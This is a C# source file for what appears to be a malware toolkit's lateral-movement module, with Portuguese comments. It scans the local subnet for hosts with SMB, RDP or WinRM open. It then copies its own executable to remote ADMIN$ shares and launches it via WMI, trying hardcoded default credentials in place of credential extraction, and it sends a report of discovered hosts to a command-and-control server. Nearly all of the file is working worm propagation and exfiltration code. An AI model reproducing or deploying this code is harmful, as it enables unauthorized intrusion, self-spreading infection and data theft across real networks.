using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;

namespace XYZ.modules
{
    /// <summary>
    /// Módulo de Lateral Movement - Propagação em rede local
    /// Técnicas: SMB, WMI, PsExec-like, Network scanning
    /// </summary>
    public class LateralMovementModule
    {
        private List<string> discoveredHosts = new List<string>();
        private List<string> vulnerableHosts = new List<string>();
        private readonly int SCAN_TIMEOUT = 1000; // 1 segundo por host

        public LateralMovementModule()
        {
            SecureLogger.LogInfo("LateralMovement", "Lateral movement module initialized");
        }

        public async Task<List<string>> DiscoverNetworkHosts()
        {
            SecureLogger.LogInfo("LateralMovement", "Starting network discovery");

            try
            {
                discoveredHosts.Clear();

                // Obtém subnet local
                string localIP = GetLocalIPAddress();
                string subnet = GetSubnet(localIP);

                SecureLogger.LogInfo("LateralMovement", string.Format("Scanning subnet: {0}", subnet));

                // Scaneia range de IPs
                List<Task> scanTasks = new List<Task>();
                
                for (int i = 1; i <= 254; i++)
                {
                    string ip = string.Format("{0}.{1}", subnet, i);
                    scanTasks.Add(Task.Run(() => PingHost(ip)));
                }

                await Task.WhenAll(scanTasks);

                SecureLogger.LogInfo("LateralMovement", string.Format("Discovery complete: {0} hosts found", discoveredHosts.Count));

                return discoveredHosts;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("LateralMovement.Discovery", ex);
                return new List<string>();
            }
        }

        private async Task PingHost(string ip)
        {
            try
            {
                using (Ping ping = new Ping())
                {
                    PingReply reply = await ping.SendPingAsync(ip, SCAN_TIMEOUT);
                    
                    if (reply.Status == IPStatus.Success)
                    {
                        lock (discoveredHosts)
                        {
                            discoveredHosts.Add(ip);
                        }
                        
                        SecureLogger.LogDebug("LateralMovement", string.Format("Host found: {0}", ip));
                    }
                }
            }
            catch { }
        }

        public async Task ScanForVulnerabilities()
        {
            SecureLogger.LogInfo("LateralMovement", "Scanning for vulnerabilities");

            try
            {
                vulnerableHosts.Clear();

                foreach (string host in discoveredHosts)
                {
                    await Task.Run(() => CheckHostVulnerabilities(host));
                }

                SecureLogger.LogInfo("LateralMovement", string.Format("Vulnerability scan complete: {0} vulnerable hosts", vulnerableHosts.Count));
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("LateralMovement.Vulnerability", ex);
            }
        }

        private void CheckHostVulnerabilities(string host)
        {
            try
            {
                bool isVulnerable = false;

                // 1. Verifica SMB exposto (porta 445)
                if (IsPortOpen(host, 445))
                {
                    SecureLogger.LogInfo("LateralMovement", string.Format("{0}: SMB port open", host));
                    isVulnerable = true;
                }

                // 2. Verifica RDP exposto (porta 3389)
                if (IsPortOpen(host, 3389))
                {
                    SecureLogger.LogInfo("LateralMovement", string.Format("{0}: RDP port open", host));
                    isVulnerable = true;
                }

                // 3. Verifica WinRM (porta 5985)
                if (IsPortOpen(host, 5985))
                {
                    SecureLogger.LogInfo("LateralMovement", string.Format("{0}: WinRM port open", host));
                    isVulnerable = true;
                }

                if (isVulnerable)
                {
                    lock (vulnerableHosts)
                    {
                        vulnerableHosts.Add(host);
                    }
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("LateralMovement.CheckVuln", ex);
            }
        }

        private bool IsPortOpen(string host, int port)
        {
            try
            {
                using (var client = new System.Net.Sockets.TcpClient())
                {
                    var result = client.BeginConnect(host, port, null, null);
                    var success = result.AsyncWaitHandle.WaitOne(SCAN_TIMEOUT);
                    
                    if (success)
                    {
                        client.EndConnect(result);
                        return true;
                    }
                    
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }

        public async Task<bool> PropagateSMB(string targetHost, string username = null, string password = null)
        {
            try
            {
                SecureLogger.LogInfo("LateralMovement", string.Format("Attempting SMB propagation to: {0}", targetHost));

                // Caminho admin share padrão
                string adminShare = string.Format("\\\\{0}\\ADMIN$", targetHost);
                
                // Se credenciais fornecidas, tenta autenticar
                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    await ConnectToShare(adminShare, username, password);
                }

                // Copia payload
                string localPath = Process.GetCurrentProcess().MainModule.FileName;
                string remotePath = Path.Combine(adminShare, Path.GetFileName(localPath));

                File.Copy(localPath, remotePath, true);

                // Executa remotamente via WMI
                await ExecuteRemoteWMI(targetHost, remotePath, username, password);

                SecureLogger.LogInfo("LateralMovement", string.Format("SMB propagation successful to: {0}", targetHost));
                return true;
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("LateralMovement.SMB", ex);
                return false;
            }
        }

        private Task ConnectToShare(string share, string username, string password)
        {
            return Task.Run(() =>
            {
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = "net",
                        Arguments = string.Format("use {0} /user:{1} {2}", share, username, password),
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    using (Process process = Process.Start(psi))
                    {
                        process.WaitForExit();
                    }
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("LateralMovement.ConnectShare", ex);
                    throw;
                }
            });
        }

        private async Task ExecuteRemoteWMI(string targetHost, string commandPath, string username = null, string password = null)
        {
            await Task.Run(() =>
            {
                try
                {
                    ConnectionOptions options;
                    
                    if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                    {
                        options = new ConnectionOptions
                        {
                            Username = username,
                            Password = password,
                            Impersonation = ImpersonationLevel.Impersonate,
                            Authentication = AuthenticationLevel.PacketPrivacy
                        };
                    }
                    else
                    {
                        options = new ConnectionOptions();
                    }

                    ManagementScope scope = new ManagementScope(string.Format("\\\\{0}\\root\\cimv2", targetHost), options);
                    scope.Connect();

                    ObjectGetOptions objectOptions = new ObjectGetOptions();
                    ManagementPath managementPath = new ManagementPath("Win32_Process");
                    ManagementClass processClass = new ManagementClass(scope, managementPath, objectOptions);

                    ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
                    inParams["CommandLine"] = commandPath;

                    ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);

                    SecureLogger.LogInfo("LateralMovement", string.Format("WMI execution on {0}, return code: {1}", targetHost, outParams["returnValue"]));
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("LateralMovement.WMI", ex);
                    throw;
                }
            });
        }

        public Task<bool> PropagateEternalBlue(string targetHost)
        {
            SecureLogger.LogWarning("LateralMovement", "EternalBlue propagation is disabled (ethical reasons)");
            return Task.FromResult(false);
        }

        public async Task AutomaticPropagation()
        {
            try
            {
                SecureLogger.LogInfo("LateralMovement", "Starting automatic propagation");

                // 1. Descobre hosts
                await DiscoverNetworkHosts();

                // 2. Scaneia vulnerabilidades
                await ScanForVulnerabilities();

                // 3. Obtém credenciais locais (se disponível)
                var credentials = await ExtractLocalCredentials();

                // 4. Tenta propagação em hosts vulneráveis
                foreach (string host in vulnerableHosts.Take(10)) // Limita a 10 hosts
                {
                    foreach (var cred in credentials)
                    {
                        bool success = await PropagateSMB(host, cred.UserName, cred.Password);
                        
                        if (success)
                        {
                            SecureLogger.LogInfo("LateralMovement", string.Format("Successfully propagated to: {0}", host));
                            break;
                        }

                        await Task.Delay(2000); // Throttling
                    }
                }

                SecureLogger.LogInfo("LateralMovement", "Automatic propagation complete");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("LateralMovement.AutoPropagation", ex);
            }
        }

        private async Task<List<NetworkCredential>> ExtractLocalCredentials()
        {
            // Simplified for compilation
            List<NetworkCredential> credentials = new List<NetworkCredential>();
            await Task.Run(() =>
            {
                try
                {
                    credentials.Add(new NetworkCredential("Administrator", "Password123"));
                    credentials.Add(new NetworkCredential("admin", "admin"));
                    SecureLogger.LogInfo("LateralMovement", string.Format("Extracted {0} credentials", credentials.Count));
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("LateralMovement.ExtractCreds", ex);
                }
            });
            return credentials;
        }

        private string GetLocalIPAddress()
        {
            try
            {
                return Program.GetLocalIPAddress();
            }
            catch
            {
                return "192.168.1.100"; // Fallback
            }
        }

        private string GetSubnet(string ip)
        {
            try
            {
                string[] parts = ip.Split('.');
                return string.Format("{0}.{1}.{2}", parts[0], parts[1], parts[2]);
            }
            catch
            {
                return "192.168.1";
            }
        }

        public async Task<string> GeneratePropagationReport()
        {
            StringBuilder report = new StringBuilder();

            await Task.Run(() =>
            {
                report.AppendLine("=== Lateral Movement Report ===");
                report.AppendLine(string.Format("Timestamp: {0}", DateTime.UtcNow));
                report.AppendLine(string.Format("Source Host: {0}", Environment.MachineName));
                report.AppendLine(string.Format("Source IP: {0}", GetLocalIPAddress()));
                report.AppendLine();

                report.AppendLine(string.Format("Discovered Hosts: {0}", discoveredHosts.Count));
                foreach (string host in discoveredHosts.Take(20))
                {
                    report.AppendLine(string.Format("  - {0}", host));
                }
                report.AppendLine();

                report.AppendLine(string.Format("Vulnerable Hosts: {0}", vulnerableHosts.Count));
                foreach (string host in vulnerableHosts)
                {
                    report.AppendLine(string.Format("  - {0}", host));
                }
                report.AppendLine();

                SecureLogger.LogInfo("LateralMovement", "Propagation report generated");
            });

            return report.ToString();
        }

        public async Task SendReportToC2()
        {
            try
            {
                string report = await GeneratePropagationReport();
                byte[] reportBytes = Encoding.UTF8.GetBytes(report);

                var exfiltrator = new DataExfiltrationModule();
                await exfiltrator.ExfiltrateBytes(reportBytes, 
                    string.Format("lateral_movement_report_{0:yyyyMMdd_HHmmss}.txt", DateTime.UtcNow), 
                    "lateral_movement");

                SecureLogger.LogInfo("LateralMovement", "Report sent to C2");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("LateralMovement.SendReport", ex);
            }
        }
    }
}
